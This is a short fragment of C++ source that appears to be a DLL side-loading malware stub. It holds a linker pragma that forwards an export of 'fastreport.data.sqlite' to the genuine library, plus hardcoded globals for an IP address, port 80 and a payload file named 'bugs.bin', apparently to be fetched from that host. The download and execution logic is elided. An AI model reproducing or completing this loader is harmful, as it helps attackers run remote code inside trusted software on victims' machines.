...
#include "fstream"
#include <iostream>
char ip[] = "172.16.49.225";
char port[] = "80";
char resource[] = "bugs.bin";
...
#pragma comment(linker,"/export:fastreport.data.sqlite:=E:\\work\\factsreport\\fastreport\\fastreport.data.sqlite.,@184")
